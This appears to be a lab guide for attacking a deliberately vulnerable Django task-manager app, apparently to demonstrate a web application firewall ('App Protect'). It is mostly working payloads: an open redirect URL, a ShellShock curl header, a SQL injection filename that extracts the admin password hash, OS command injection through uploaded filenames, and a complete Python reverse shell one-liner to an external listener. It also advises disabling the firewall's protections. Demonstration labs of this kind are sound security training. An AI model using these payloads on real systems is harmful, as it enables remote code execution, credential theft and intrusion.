# Instructions for exploiting vulnerabilities in the djangonv app

## App Protect Policy

Before beginning, some adjustments need to be made to the App Protect policy in order to allow some of the (poorly written) code to run:


/taskManager/register triggers the SQL Injection Syntax Error algorithm.  It's best to disable it for this app.

/taskManager/login/, /taskManager/logout and others triggers Redirect Protection.  Need to alter policy to allow http://127.0.0.1:8000/*


## Exploits

### Open Redirect Vulnerability

The /taskManager/logout endpoint is susceptible to an open redirect.
Threat actors can leverage these types of vulnerabilities to redirect the user's browser to a URL of their choice.  
The typical exploit vector is via a malicious embedded link in an email.

Demonstrate the vulnerability by pasting the following into the browser's URL space:
```
http://127.0.0.1:8000/taskManager/logout?redirect=http://www.yahoo.com
```

### Malicious Payload (Intrusion Prevention)
Open a terminal window and past in the following (ShellShock) exploit:
```
curl -H "User-Agent: () { :; }; /bin/eject" http://127.0.0.1:8000
```
### Remote Command Execution

To trigger a Remote Command Execution (that's actually both a RCE and SQLi..), do this:
```
1. Go to http://127.0.0.1:8000/ and click "Sign Up"
```
```
2. Fill out the form and click Register (remember your username and password.  ie: test, test, test, test@test.com test)
```
```
3. Login as the new user.
```
```
4. Once logged in, create a new project by replacing the URL with:  http://127.0.0.1:8000/taskManager/project_create
```
```
5. Fill out the form with some data.  Be sure to select a future date for the project due date!
```
```
6. Click the link for the new project you just created.
```
```
7. Click the "Add files" link.  
```
```
8. Pick any file from your local computer, and use the following payload for the filename:

'||(SELECT password FROM auth_user WHERE username='admin')||'

```
Once this exploit has succeeded, you should see the file in the project file list. The filename contains the MD5 hash of the password of the admin user (after the "md5$"). You should be able to crack this password using JTR or rainbow tables or other.

### OS Command Injection:

In the same place as in for the attack above ("My Projects" --> project you created, add files).
Also pick any file from your local computer, but for the payload use:

An innocent sleep statement (to demonstrate that we can run any command):
```
some_file_name; sleep 1m
```
You'll notice that (without App Protect), the browser will "sleep" for 1 minute.


python reverse shell:
```
some_file_name; python -c 'import socket, subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("192.168.64.1", 8001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Note:  You'll need to set up a listener on an external host in order for this reverse shell to actually connect.  In this case the host is at 192.168.64.1 and is listening on port 8001.
